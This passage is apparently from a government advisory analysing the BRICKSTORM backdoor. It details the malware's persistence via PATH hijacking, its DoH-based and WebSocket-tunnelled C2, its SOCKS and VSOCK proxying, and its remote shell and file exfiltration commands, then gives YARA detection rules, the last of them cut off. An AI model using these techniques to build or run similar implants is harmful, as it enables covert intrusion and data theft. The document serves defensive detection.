10d811029f6e5f58cd06143d6353d3b05bc06d0f \nSHA256 73fe8b8fb4bd7776362fd356fdc189c93cf5d9f6724f6237d829024c10263fe5 \nSHA512 8e29aeb3603ffe307b2d60f7401bd9978bebe8883235eb88052ebf6b9e04ce6bf356674\n80cedea5712c1e13e8c6dcfb34d5fde0ddca6ca31328de0152509bf8f \nssdeep 98304:78Se5lqfYMKDdopPx0E4j+dM/GLaCXNwqYL6wt/5APUnU:78Se54fYMUaiE4j+dM/GL\naCXNmLP+ \nEntropy 6.063928 \nMalware Functionality \nNote: This analysis is of Samples 1 through 8. See Appendix C: Dec. 19, 2025, Updates for functionality of \nSamples 9 through 11. \nAll analyzed samples enable cyber actors to maintain stealthy access and provide capabilities for \nenvironment configuration (initiation), persistence, and secure C2. While initiation and persistence \nfunctions are similar across the samples, the secure C2 function varies. BRICKSTORM uses custom \nhandlers to set up a SOCKS proxy, create a web server on the compromised system, and execute \ncommands on the compromised system. \nSamples 7 and 8 were designed to work in virtualized environments, using a virtual socket (VSOCK) \ninterface to enable inter-VM communication, facilitate data exfiltration, and maintain persistence. \nMost samples used Exclusive OR (XOR) cipher encryption to hide key strings, such as the Internet Protocol \nversion 4 (IPv4) addresses of public DoH servers, within their code. \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 11 of 48 TLP:CLEAR \nInitiation Capabilities \nUpon execution, BRICKSTORM runs checks and can reinstall and restart itself to maintain persistence. \nBRICKSTORM initiates a function (referred to as main_startNew in some samples) to configure \nenvironment variables specific to the compromised environment, enabling it to operate effectively. \nFollowing this, BRICKSTORM identifies if it is already in its intended state and proceeds to continue \nrunning, copy itself for execution, or terminate based on the following logic: \n1. Environment Variable Check: BRICKSTORM checks a specified environment variable (differs by \nsample; see Table 9) to determine if it is running as a child process (to identify if it is running in its \nintended state). \na. If the specified variable is set, indicating it is running as a child process, BRICKSTORM \ncontinues its code execution. \nb. If the specified variable is not set (indicating it is not running as a child process), BRICKSTORM \nchecks whether it is executing from /etc/sysconfig/ (Samples 1 through 2 and 4 through 7) \nor /etc/sysconfig/network/ (Sample 3) by attempting to load file contents from that path. \n2. File Path Validation and Copying: If BRICKSTORM is running from the validated path, it copies itself \nto a specific location with a specific file name. \nc. Next, the parent BRICKSTORM instance modifies the PATH environment variable by appending \nthe copied location\u2019s path [T1574.007]. This ensures the newly copied version of BRICKSTORM \nwill be executed first if any commands or processes attempt to run VMware vSphere. \nd. The parent instance subsequently executes the copied instance of BRICKSTORM with the \nspecified variable set in the context of the child process and terminates its own execution. \n3. Termination: If BRICKSTORM is not running from the validated path, it terminates its own \nexecution. \nSee Figure 2 for the operational flow of the malware. \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 12 of 48 TLP:CLEAR \n \nFigure 2. BRICKSTORM Operational Flow, Malware Initiation \nSee Table 9 for checked variables, copied locations, and copied file names of the analyzed samples. \nTable 9. BRICKSTORM Initiation Checks and Copied File Information \nSample \nChecked Environment Variable \nto Determine if Running as a \nChild Process \nCopied Location Copied File Name \nSample 1 VMware [T1036] /opt/vmware/sbin vmware-sphere \nSample 2 [redacted]ET4 /usr/java/jre-vmware/bin/ updatemgr \nSample 3 CZePMeGj etc/applmgmt/appliance/ vami \nSample 4 [redacted]NET6 /usr/java/jre-vmware/bin/ updatemgr \nSample 5 FIOON /usr/java/jre-vmware/bin/ updatemgr \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 13 of 48 TLP:CLEAR \nSample \nChecked Environment Variable \nto Determine if Running as a \nChild Process \nCopied Location Copied File Name \nSample 6 [redacted]NET4 /usr/java/jre-vmware/bin/ updatemgr \nSample 7 VREG   \nSample 8 VARGS   \nPersistence Capabilities \nTo ensure its continued operations, BRICKSTORM uses built-in self-monitoring and persistence capabilities \nwhile running. Specifically, it has a built-in self-watching function (referred to as main_selfWatcher in \nsome samples) to maintain persistence. This function monitors if BRICKSTORM is running correctly and, if \nnot, BRICKSTORM reinstalls and executes itself, mirroring its initiation capabilities. \nThe self-watching function begins by checking a specific environment variable (see Table 10) to confirm \nwhether BRICKSTORM is running as an active process. If the check returns a false value (indicating the \nvariable is not set), BRICKSTORM assumes it is not running properly. In response, BRICKSTORM re-installs \nitself from predefined file path\u2014/etc/sysconfig/ (Samples 1 through 2 and 4 through 8) or \n/etc/sysconfig/network/ (Sample 3)\u2014to a new location (the file name of the new BRICKSTORM \ninstance and location copied varies by sample; see Table 10). BRICKSTORM then updates the PATH \nenvironment variable to include the new file location, ensuring the newly copied backdoor file is executed \nfirst. Subsequently, the parent instance terminates its own execution, allowing the new process to take \nover. \nIf the initial checks confirm that BRICKSTORM is running as intended (the variable is set), the self-watcher \nfunction allows the code to continue its operations. \nSee Table 10 for details on checked variables, processes, copied locations, and file names associated with \nthe analyzed samples. \nTable 10. BRICKSTORM Checked Variables, Processes, and Copied Names and Locations \nSample Checked \nEnvironment Variable \nChecked Process \nExistence \nCopies To Newly Copied \nFile Name \nSample 1 Sphere vmware-sphere /opt/vmware/sbin/ vmware-\nsphere \nSample 2 [redacted]NET3 vnetd /usr/java/jre-vmware/bin/ updatemgr \nSample 3 rcMJVF vami /etc/applmgmt/appliance/ vami \nSample 4 [redacted]NET5 updatemgr /usr/java/jre-vmware/bin/ updatemgr \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 14 of 48 TLP:CLEAR \nSample Checked \nEnvironment Variable \nChecked Process \nExistence \nCopies To Newly Copied \nFile Name \nSample 5 DIGNN updatemgr /usr/java/jre-vmware/bin/ updatemgr \nSample 6 [redacted]NET3 updatemgr /usr/java/jre-vmware/ updatemgr \nSample 7 VREG    \nSample 8 VARGS    \nSecure Command and Control \nAfter passing initiation checks, BRICKSTORM establishes a connection to a C2 server, secures \ncommunications with the server, and enables cyber actors\u2019 full control over the compromised system. This \ncontrol includes capabilities such as file system management and interactive shell access. In most \nsamples, BRICKSTORM also provides a SOCKS proxy to facilitate tunneling and lateral movement. \nThe implementation of these capabilities varies across samples, with notable differences in Samples 7 and \n8, which specifically target virtualized environments. \nSample 1 \nInitial Connection to the C2 Server: Sample 1 first creates an encrypted Domain Name System (DNS) query \nfor a hard-coded C2 domain (the domain has been redacted from this report because according to public \nreporting, the cyber threat actors are not reusing C2 domains).4 The sample uses DoH to resolve the \naddress of its C2 servers by sending an encrypted HTTPS request to one of the following legitimate public \nDoH resolvers [T1071.001]: \n\u25aa https[:]//1.0.0[.]1/dns-query (Cloudflare) \n\u25aa https[:]//1.1.1[.]1/dns-query (Cloudflare) \n\u25aa https[:]//8.8.4[.]4/dns-query (Google) \n\u25aa https[:]//8.8.8[.]8/dns-query (Google) \n\u25aa https[:]//9.9.9[.]9/dns-query (Quad9) \nIf the C2 domain is not found in the public DoH resolver cache, the legitimate resolver forwards the request \nto the next server in the DNS hierarchy, ultimately reaching the threat actors\u2019 DNS server. The DNS server \nresponds with the correct IP address for the domain. The response is sent back through the legitimate DoH \nresolver to BRICKSTORM, which receives the encrypted response, decrypts it to get the C2 server\u2019s IP \naddress, and establishes a connection. \nEstablishing Secure Communications: Sample 1 establishes an encrypted connection to the C2 server \nusing HTTPS, then upgrades the session to WebSockets with an additional layer of TLS encryption. To do \nthis, Sample 1 first communicates over HTTPS with a specific legitimate cloud platform (redacted). The \nsample then sends an HTTP upgrade request to convert the initial encrypted HTTPS connection into a \npersistent WebSocket connection: wss://[REDACTED].com/api. Sample 1 nests additional layers of TLS \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 15 of 48 TLP:CLEAR \nencryption within the WebSocket session and performs a series of nested TLS handshakes within the \nestablished WebSocket tunnel. The first handshake is the standard TLS handshake for the initial HTTPS \nrequest to the cloud platform. The second TLS handshake occurs within the WebSocket tunnel, during \nwhich BRICKSTORM authenticates itself to the C2 server using a hard-coded key. \nUpon successful authentication, BRICKSTORM establishes a multiplexing layer, which allows it to send \nmultiple commands and data streams over the same connection. It does this using both Simple \nMultiplexing (smux) and Yet Another Multiplexer (Yamux) libraries to create virtual streams over a single \nunderlying TLS-secured connection based on client configuration or handshake data. Multiplexing conceals \nthreat actor activity by embedding multiple commands and network tunnels within a single encrypted \nstream. \nSee Figure 3 for the applicable decompiler output. \n \nFigure 3. BRICKSTORM Decompiler Output for Establishing Secure Connections \n  \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 16 of 48 TLP:CLEAR \nFull System Control: Once the secure connection to the C2 domain is established, Sample 1 uses a custom \nGo package wssoft2 to manage incoming network connections and to process commands it receives. \nCommands are directed to one of three handlers based on the function it needs: SOCKS Handler, Web \nService Handler, and Command Handler. \nThe SOCKS Handler sets up a SOCKS proxy [T1090.001] to route C2 traffic and facilitate lateral movement \nwithin the victim network. To set up the proxy, the handler parses JSON requests from the C2 server. If the \nrequest is valid, the handler delegates request handling to \nwssoft2/core/handler/socks.SocksWithLocalAddr, which performs SOCKS relaying and network \ntunneling over Transmission Control Protocol (TCP), User Datagram Protocol (UDP), and Internet Control \nMessage Protocol (ICMP). \nSee Figure 4 for the handler\u2019s decompiler output. \n \nFigure 4. SOCKS Handler Decompiler Output \nThe Web Service Handler establishes covert C2 communication by creating a legitimate-appearing web \nserver on the compromised system. It uses the net/http package and gorilla/mux library to create \nthe web server, which includes a hidden Application Programming Interface (API) endpoint for receiving and \nexecuting commands from the C2 server. See Figure 5 for the Web Service Handler decompiler output that \nsets up specific API endpoints. \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 17 of 48 TLP:CLEAR \n \nFigure 5. Web Service Handler Decompiler Output Setting Up the Web Server With Specific API Endpoints \nThrough the API, the cyber actors can browse, upload, download, create, delete, and manipulate files and \nfolders on the victim\u2019s system. See Table 11 for file management commands contained in BRICKSTORM. \nTable 11. BRICKSTORM File Management Commands \nCommand Function \nfile-md5 Calculates the MD5 checksum of a specified file to verify file integrity. \nget-file Downloads a file from the compromised system to the C2 server [T1041]. \nlist-dir Lists the contents of a directory on the compromised system (e.g., browses the file system) \n[T1083]. \nput-file Uploads a file from the C2 server to the compromised system. \nslice-up Reads and downloads specific, partial sections of a file. \nTo evade detection, BRICKSTORM serves seemingly legitimate web file types, such as Hypertext Markup \nLanguage (HTML), Cascading Style Sheets (CSS), and JavaScript, from a designated directory. \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 18 of 48 TLP:CLEAR \nSee Figure 6 for the Web Service Handler decompiler output. \n \nFigure 6. Web Service Handler Decompiler Output \nThe Command Handler executes shell commands on the compromised system, giving the cyber threat \nactors full control over the compromised system through interactive command-line access. The handler \nreceives a JSON request from the C2 server, parses it, and extracts it. The handler then sets up a pseudo-\nterminal (a virtual command-line interface) and runs the command on the victim system. \nSee Figure 7 for the Command Handler decompiler output. \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 19 of 48 TLP:CLEAR \n \nFigure 7. Command Handler Decompiler Output \nSamples 2 Through 6 \nInitial Connection to the C2 Server: Like Sample 1, these samples create an encrypted DNS query for hard-\ncoded C2 domains (redacted) and use DoH to resolve the addresses of their C2 servers by sending an \nencrypted HTTPS request to one of the following legitimate public DoH resolvers: \n\u25aa https[:]//1.0.0[.]1/dns-query (Cloudflare) \n\u25aa https[:]//1.1.1[.]1/dns-query (Cloudflare) \n\u25aa https[:]//149.112.112[.]11/dns-query (Quad9) \n\u25aa https[:]//45.90.28.160/dns-query (NextDNS) \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 20 of 48 TLP:CLEAR \n\u25aa https[:]//8.8.4[.]4/dns-query (Google) \n\u25aa https[:]//8.8.8[.]8/dns-query (Google) \n\u25aa https[:]//9.9.9[.]11/dns-query (Quad9) \n\u25aa https[:]//9.9.9[.]9/dns-query (Quad9) \nNote: Some of these samples use XOR encryption to decrypt IPv4 addresses for DoH servers. \nEstablishing Secure Communications: Like Sample 1, these samples establish WebSocket Secure (WSS) \nconnections with the C2 server and set up a multiplexing layer. \nFull System Control: Once the connection is established with the C2 server via WebSockets, these \nBRICKSTORM samples receive commands that are directed to one of four specific handlers to perform \ntasks on the compromised system: SOCKS Handler, Web Service Handler, Command Handler, or \nCommandNoContext Handler. The SOCKS, Web Service, and Command Handlers function similar to the \nSample 1 handlers. The CommandNoContext Handler executes shell commands on the compromised \nsystem without using an explicit security context. \nSample 7 \nInitial Connection to the C2 Server: Sample 7 retrieves configuration parameters from environment \nvariables, performs checks, generates a TLS configuration used for secure communication to \nBRICKSTORM\u2019s client, and starts a network communications routine. This sample also uses a VSOCK \ninterface to enable inter-VM communication, support data exfiltration, and maintain persistence in \nvirtualized environments.  \nUpon execution, Sample 7 retrieves the following three configuration values from environment variables \nusing the os_Getenv function: \n\u25aa listenAddr (listen address and port) \n\u25aa listenPath (listen path to route requests to the WSS connection) \n\u25aa password (authentication key) \nEstablishing Secure Communications: Sample 7 establishes a secure WebSocket server with minimal \nexternal dependencies; specifically, all communication is encrypted using in-memory self-signed \ncertificates. This enables encrypted communication without relying on publicly trusted Certificate \nAuthorities (CAs) or storing certificate files on disk. It dynamically generates a self-signed X.509 certificate \nand a corresponding 2048-bit Rivest\u2013Shamir\u2013Adleman (RSA) private key in memory, which are loaded into \na tls.Certificate struct and assigned to the certificate field\u2019s tls.Config object. This allows the \nserver to handle HTTPS/WSS connections using the in-memory self-signed certificate, as standard \nNET/HTTP servers are configured to use tls.Config. \nSample 7 uses a single, multiplexed connection over secure WebSockets to communicate with a specified \nC2 address (retrieved from the listenAddr value) and path (retrieved from the listenPath value). \nDuring or before the WSS handshake, Sample 7 implements a custom authentication check, involving the \nspecific pre-shared authentication key (retrieved from password value). \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 21 of 48 TLP:CLEAR \nFull System Control: Once the WSS connection with the C2 server is established, Sample 7 processes \nincoming commands through one of four handlers: Web Service Handler, Command Handler, VSOCK-proxy \nhandler, or VSOCK handler. \nThe Web Service Handler functions similar to Sample 1\u2019s Web Service Handler. \nThe Command Handler functions similar to Sample 1\u2019s Command Handler. \nThe VSOCK-proxy Handler performs VSOCK relaying and network tunneling. It implements a proxy with \nspecific configuration arguments to establish a tunneled connection to process JSON payloads. First, the \nhandler unmarshals the payload data and extracts and validates the TunnelAddr, Context ID (CID), \nPort, and Family configuration arguments. Based on the validated arguments, the handler binds to a \nspecific VSOCK address (defined by the CID and port) and establishes a connection to the destination \nspecified by TunnelAddr. When the connection is completed or terminated, the handler sends an \nappropriate success or error response back to the client. This functionality enables cyber actors to \nmaintain covert communication channels, evade detection, and pivot within virtualized environments. \nThe VSOCK Connection Handler creates and connects to VSOCK endpoints to maintain covert connections \nwithin the virtual environment. It processes incoming network requests containing a JSON payload with \nspecific configuration arguments for connecting to a VSOCK endpoint. The handler extracts the JSON \npayload from the request and uses a JSON parser to unmarshal the data into a structured object with fields \nfor Context (CID), Port, and Family. The handler checks the unmarshalled data for validity and, if the \nconfiguration is valid, the handler establishes a connection to a VSOCK endpoint using a specified CID and \nport number. If the virtual socket creation is successful, the handler allocates a new runtime object to hold \nthe CID and port information. If unmarshalling fails, validation fails, or the destination connection cannot \nbe established, the handler returns an appropriate error to the client. \nSample 8 \nLike Sample 7, Sample 8: \n\u25aa Retrieves C2 parameters (listenAddr, listenPath, and password) from environment variables, \n\u25aa Uses a self-signed X.509 certificate and a corresponding 2048-bit RSA private key in memory to \nfacilitate encrypted communications without relying on a CA, \n\u25aa Establishes a secure WebSocket server for encrypted communication, and \n\u25aa Directs commands to specific handlers. \nSample 8\u2019s handlers directing commands differ from Sample 7. In addition to a Web Service Handler, \nCommand Handler, VSOCK-proxy Handler, and VSOCK Connection Handler, Sample 8 also has two \nadditional handlers: The SOCKS Handler (which functions similar to Sample 1\u2019s SOCKS Handler) and the \nCommandNoContext Handler (which functions similar to Samples 2 through 6\u2019s CommandNoContext \nHandler). \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 22 of 48 TLP:CLEAR \nDetection \nYARA Rules \nDeploy the CISA-created YARA rules in Table 12 to detect malicious activity. See Appendix B: Scanning \nGuidance on Remote Hosts for guidance on how to identify activity with these rules.  \nTable 12. YARA Rules \nBRICKSTORM Rule 1 \nrule CISA_251165_02 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251165\" \ndate = \"2025-09-29\" \nlast_modified = \"202051001_1008\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"aaf5569c8e349c15028bc3fac09eb982efb06eabac955b705a6d447263658e38\" \nstrings: \n$s0 = { 6D 61 69 6E 2E 73 74 61 72 74 4E 65 77 } \n$s1 = { 6D 61 69 6E 2E 73 65 6C 66 57 61 74 63 68 65 72 } \n$s2 = { 6D 61 69 6E 2E 73 65 74 53 65 72 76 69 63 65 43 66 67 } \n$s3 = { 73 6F 63 6B 73 2E 48 61 6E 64 6C 65 53 6F 63 6B 73 52 65 71 75 65 73 74 } \n$s4 = { 77 65 62 2E 57 65 62 53 65 72 76 69 63 65 } \n$s5 = { 63 6F 6D 6D 61 6E 64 2E 48 61 6E 64 6C 65 54 54 59 52 65 71 75 65 73 74 } \n$s6 = { 77 65 62 73 6F 63 6B 65 74 2E 28 2A 57 53 43 6F 6E 6E 65 63 74 6F 72 29 2E 43 6F 6E \n6E 65 63 74 } \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 23 of 48 TLP:CLEAR \n$s7 = { 66 73 2E 28 2A 57 65 62 53 65 72 76 65 72 29 2E 52 75 6E 53 65 72 76 65 72 } \n$s8 = { 68 74 74 70 73 3A 2F 2F 31 2E 30 2E 30 2E 31 2F 64 6E 73 2D 71 75 65 72 79 } \n$s9 = { 68 74 74 70 73 3A 2F 2F 31 2E 31 2E 31 2E 31 2F 64 6E 73 2D 71 75 65 72 79 } \n$s10 = { 68 74 74 70 73 3A 2F 2F 38 2E 38 2E 34 2E 34 2F 64 6E 73 2D 71 75 65 72 79 } \n$s11 = { 68 74 74 70 73 3A 2F 2F 38 2E 38 2E 38 2E 38 2F 64 6E 73 2D 71 75 65 72 79 } \n$s12 = { 68 74 74 70 73 3A 2F 2F 39 2E 39 2E 39 2E 39 2F 64 6E 73 2D 71 75 65 72 79 } \ncondition: \n8 of them \n} \nBRICKSTORM Rule 2 \nrule CISA_251155_02 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251155\" \ndate = \"2025-09-15\" \nlast_modified = \"20250916_1511\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"320a0b5d4900697e125cebb5ff03dee7368f8f087db1c1570b0b62f5a986d759\" \nsha256_1 = \"dfac2542a0ee65c474b91d3b352540a24f4e223f1b808b741cfe680263f0ee44\" \nsha256_1 = \"b91881cb1aa861138f2063ec130b2b01a8aaf0e3f04921e5cbfc61b09024bf12\" \nsha256_1 = \"bfb3ffd46b21b2281374cd60bc756fe2dcc32486dcc156c9bd98f24101145454\" \nstrings: \n$s0 = { 04 30 0F B6 54 04 2C 31 D1 88 4C 04 34 48 FF C0 } \n$s1 = { 48 83 F8 04 7C E7 48 C7 04 24 } \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 24 of 48 TLP:CLEAR \n$s2 = { 48 8D 44 24 34 48 89 44 24 08 48 C7 44 24 10 04 } \n$s3 = { 48 89 44 24 48 48 89 4C 24 50 48 8B 6C 24 38 48 } \n$s4 = { 48 83 EC 40 48 89 6C 24 38 48 8D 6C 24 38 C7 44 24 } \n$s5 = { 83 EC 38 48 89 6C 24 30 48 8D 6C 24 30 C6 44 24 } \n$s6 = { 4C 24 20 48 89 44 24 40 48 89 4C 24 48 48 8B 6C } \n$s7 = { 64 48 8B 0C 25 F8 FF FF FF 48 3B 61 10 0F 86 81 } \n$s8 = { 64 48 8B 0C 25 F8 FF FF FF 48 3B 61 10 0F 86 91 } \ncondition: \nall of them \n} \nBRICKSTORM Rule 3 (Added Dec. 19, 2025) \nrule CISA_251155_01 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251155\" \ndate = \"2025-09-15\" \nlast_modified = \"20250916_1511\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"2bf9bfa1f9bcbcad0eada7e3be8d380d809248f08609f6e9d971b37ce09f7e93\" \nsha256_2 = \"6d42e9a0757670b9837034b5202d1673093577757b44bb0f0253f366413393e9\" \nsha256_3 = \"b30041b986ee3231fd53522c9d0c57e4567d6c60959fa06c125dde2af558fc9f\" \nstrings: \n$s0 = { 88 14 08 48 FF C1 } \n$s1 = { 2F 63 6F 72 65 2F 74 61 73 6B 2E 44 6F 54 61 73 6B 2E 66 75 6E 63 31 } \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 25 of 48 TLP:CLEAR \n$s2 = { 2F 63 6F 72 65 2F 74 61 73 6B 2E 44 6F 54 61 73 6B 2E 66 75 6E 63 31 2E 32 } \n$s3 = { 2F 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 77 65 62 2E 57 65 62 53 65 72 76 69 63 65 \n} \n$s4 = { 2F 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 77 65 62 2E 57 65 62 53 65 72 76 69 63 65 \n2E 66 75 6E 63 31 } \n$s5 = { 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 73 6F 63 6B 73 2E 53 6F 63 6B 73 } \n$s6 = { 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 73 6F 63 6B 73 2E 53 6F 63 6B 73 2E 66 75 6E \n63 31 } \n$s7 = { 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 63 6F 6D 6D 61 6E 64 2E 43 6F 6D 6D 61 6E 64 \n} \n$s8 = { 6C 69 62 73 2F 64 6F 68 2E 51 75 65 72 79 } \n$s9 = { 2F 76 65 6E 64 6F 72 2F 68 61 73 68 69 63 6F 72 70 2F 79 61 6D 75 78 2E 53 65 72 76 \n65 72 } \ncondition: \n3 of them \n} \nRule 4 (Rust-based Samples) (Added Dec. 19, 2025) \nrule CISA_251217_03 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251217\" \ndate = \"2025-12-10\" \nlast_modified = \"20251216_729\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Rust BRICKSTORM backdoor samples\" \nsha256_1 = \"6a67a9769a55ec889a5dd4199b2fc08965d39d737838836853bc13c81c56a800\" \nsha256_2 = \"ed907d39efd5750236b075ca9fbb1f090d7bf578578c38faab24210d298a60ae\"  \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 26 of 48 TLP:CLEAR \nsha256_3 = \"0e92009fc6519c837982b3fbfd42946e827de47b73a264d693739168533d07f4\" \nsha256_4 = \"fb22eea57e00b83edad50ee6e02320377efc10586584c476d5018dbba3643c32\" \nsha256_5 = \"28a16e782f04d9394b5dfa3363d41d9f5eecc206166aeffd73363d83734a026d\" \nstrings: \n$s0 = { 20 55 70 67 72 61 64 65 3A 20 77 65 62 73 6F 63 6B 65 74 43 6F 6E 6E 65 63 74 69 6F \n6E 3A } \n$s1 = { 20 55 70 67 72 61 64 65 53 65 63 2D 57 65 62 73 6F 63 6B 65 74 2D 4B 65 79 3A } \n$s2 = { 20 53 65 63 2D 57 65 62 53 6F 63 6B 65 74 2D 56 65 72 73 69 6F 6E 3A } \n$s3 = { 57 65 62 53 6F 63 6B 65 74 53 65 63 2D 57 65 62 53 6F 63 6B 65 74 2D 41 63 63 65 \n70 74 3A } \n$s4 = { 53 77 69 74 63 68 69 6E 67 20 50 72 6F 74 6F 63 6F 6C 73 } \n$s5 = { 32 35 38 45 41 46 41 35 2D 45 39 31 34 2D 34 37 44 41 2D 39 35 43 41 2D 43 35 41 \n42 30 44 43 38 \n35 42 31 31 } \n$s6 = { 2F 64 65 76 2F 70 74 6D 78 64 6F 20 66 6F 72 6B 6F 70 65 6E 20 } \n$s7 = { 53 6F 63 6B 73 35 20 63 6D 64 20 6E 6F 74 20 73 75 70 70 6F 72 74 } \n$s8 = { 62 39 32 37 35 38 61 39 61 65 66 31 63 65 66 37 62 37 39 65 32 62 37 32 63 33 64 \n38 62 61 31 31 33 65 35 34 37 66 38 39 } \n$s9 = { 58 34 34 38 52 69 6E 67 47 45 54 20 0D 0A 0D 0A 70 69 70 65 50 69 6E 67 50 6F 6E 67 \n44 61 74 61 } \ncondition: \n9 of them \n} \nRule 5 (Added Jan. 20, 2026) \nrule CISA_251155_03 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251155\" \ndate = \"2025-09-15\" \nlast_modified = \"20250916_1511\" \nactor = \"n/a\" \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 27 of 48 TLP:CLEAR \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"0cba5c6d16c7b94a450c36bfbaeab79107ac10aa9548b02c42b4b6ba8cef6a51\" \nstrings: \n$s0 = { CE 73 63 44 0F B6 04 30 44 31 C7 48 83 FE 19 72 DA EB 53 48 C7 04 24 } \n$s1 = { 64 48 8B 0C 25 F8 FF FF FF 48 8D 44 24 E8 48 3B } \n$s2 = { 8D 44 24 5F 48 89 04 24 48 8D 05 F9 4C 12 00 48 } \n$s3 = { 8B 4C 24 20 48 89 4C 24 30 48 8D 54 24 58 48 89 } \n$s4 = { 8B 44 24 20 48 89 44 24 30 48 8B 4C 24 18 48 89 } \n$s5 = { E8 8E 6A D5 FF 48 8B 44 24 18 48 89 84 24 98 } \n$s6 = { E8 A4 69 D5 FF 48 8B 44 24 20 48 8B 4C 24 28 48 89 84 24 B0 } \n$s7 = { 48 8D 44 24 3F 48 89 44 24 08 48 C7 44 24 10 19 } \ncondition: \nall of them \n} \nRule 6 (Added Jan. 20, 2026) \nrule CISA_251186_02 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251186\" \ndate = \"2025-11-17\" \nlast_modified = \"n/a\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 28 of 48 TLP:CLEAR \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"57bd98dbb5a00e54f07ffacda1fea91451a0c0b532cd7d570e98ce2ff741c21d\" \nstrings: \n$s0 = { 31 F7 40 88 7C 04 4C 48 FF C0 } \n$s1 = { 44 01 C7 40 88 7C 14 30 48 FF C2 0F 1F 00 } \n$s2 = { 41 89 F0 31 FE 01 D6 66 90 49 83 F8 11 } \n$s3 = { 48 8B 44 24 08 48 8B 5C 24 10 48 8B 4C 24 18 } \n$s4 = { 48 89 C1 48 89 DF 48 8D 05 0F 6F 15 00} \n$s5 = { 48 8D 3D 9A 6D 15 00 4D 89 C1 49 89 F0 } \n$s6 = { 81 39 49 43 4D 50 74 0C } \n$s7 = { E8 FB E6 FF FF E8 76 D0 FF FF E8 91 C0 FF FF 48 8B 05 EA BF 53 } \ncondition: \nall of them \n} \nRule 7 (Added Feb. 11, 2026) \nrule CISA_261234_01 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"261234\" \ndate = \"2026-02-03\" \nlast_modified = \"20260203_1426\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects AOT BRICKSTORM backdoor samples\" \nsha256_1 = 